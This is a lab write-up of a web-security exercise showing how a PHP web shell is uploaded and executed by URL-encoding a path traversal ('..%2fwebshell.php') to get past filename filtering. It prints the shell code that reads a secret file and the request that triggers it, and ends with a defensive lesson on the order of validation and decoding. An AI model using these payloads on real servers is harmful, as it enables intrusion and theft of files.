# Web Shell Upload via Path Traversal


### 1. Definition
A file upload vulnerability occurs when an attacker can exploit **Path Traversal** to control where an uploaded file is stored.



In this lab, the server prevents uploaded files from being executed inside the `avatars` directory. However, this restriction can be 

bypassed by uploading the file to a higher directory where PHP execution is enabled.




### 2. Steps 




**Step 1: Capture the Upload Request**

- Logged in using `wiener:peter`.

- Uploaded an image as an avatar and intercepted the request using Burp Suite.

- Observed that uploaded files were retrieved through:


  ```http

  GET /files/avatars/<filename>

  ```



**Step 2: Upload the PHP File**

- Created a file named `webshell.php` containing:

  ```php

  <?php echo file_get_contents('/home/carlos/secret'); ?>

  ```

- Uploaded the PHP file as an avatar.

- Accessed `/files/avatars/webshell.php` and observed that the PHP code was returned as plain text instead of being executed.



**Step 3: Test Path Traversal**

- Modified the `filename` parameter inside the `Content-Disposition` header:

  ```http

  filename="../webshell.php"

  ```

- The application stripped the `../` sequence from the filename, indicating that filename validation was being applied.



**Step 4: Bypass the Validation**

- URL-encoded the forward slash using `%2f`:

  ```http

  filename="..%2fwebshell.php"

  ```

- Sent the modified request and observed the response:

  ```text

  The file avatars/../webshell.php has been uploaded.

  ```

- This indicated that the encoded traversal sequence had bypassed the validation and was decoded during subsequent path processing.



**Step 5: Retrieve the Uploaded File**

- Returned to the GET request in Burp Proxy History.

- Requested the file using:

  ```http

  GET /files/avatars/..%2fwebshell.php

  ```

- After path decoding and normalization, the path resolved to:

  ```text

  /files/webshell.php


  ```

- The server executed the PHP file and returned the contents of the secret file.



### 3. Why It Works



1. The application prevents PHP execution inside the `avatars` directory.

2. The filename validation strips ordinary `../` sequences.

3. URL encoding the forward slash as `%2f` bypasses this validation.

4. The server subsequently decodes `%2f` into `/`.

5. Path Traversal moves the uploaded file to a higher directory outside `avatars`.

6. PHP execution is enabled in the destination directory, allowing the uploaded script to execute.



### 4. Key Takeaway

**Validation and Decoding Order Matters.**



Inconsistent processing between validation, URL decoding, and path normalization can lead to Path Traversal vulnerabilities.



Successful file upload alone does not guarantee code execution. The final storage location and server execution configuration are also 
important.

